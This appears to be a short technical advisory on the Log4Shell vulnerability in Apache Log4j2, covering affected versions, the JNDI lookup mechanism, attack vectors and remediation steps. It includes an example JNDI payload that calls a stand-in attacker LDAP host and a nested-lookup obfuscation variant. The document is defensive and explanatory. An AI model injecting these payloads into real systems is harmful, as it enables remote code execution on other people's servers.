# Technical Deep Dive: Log4Shell Vulnerability (CVE-2021-44228)

## Overview
CVE-2021-44228, dubbed "Log4Shell", is a remote code execution (RCE) vulnerability in Apache Log4j2 versions 2.0-beta9 through 2.14.1. The vulnerability resides in the message lookup substitution feature where JNDI (Java Naming and Directory Interface) strings are parsed without sanitization.

## Exploitation Mechanism
When Log4j logs a string containing the syntax `${jndi:ldap://attacker.com/a}`, the JNDI lookup plugin resolves the URL. It contacts the specified LDAP server, retrieves a remote Java class file reference, and executes the payload dynamically within the Java Virtual Machine (JVM) context under the service account privileges.

## Attack Vectors
- User-Agent HTTP headers containing JNDI lookup strings.
- Form field values (username, search parameters) logged by application logging handlers.
- Nested lookups allowing bypasses like `${jndi:${lower:l}${lower:d}ap://...}`.

## Remediation and Mitigation
1. Upgrade Apache Log4j2 to version 2.17.1 or higher for Java 8 users.
2. For Log4j 2.10 to 2.14.1, set system property `log4j2.formatMsgNoLookups=true` or environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`.
3. Remove the `JndiLookup` class from the classpath using `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.
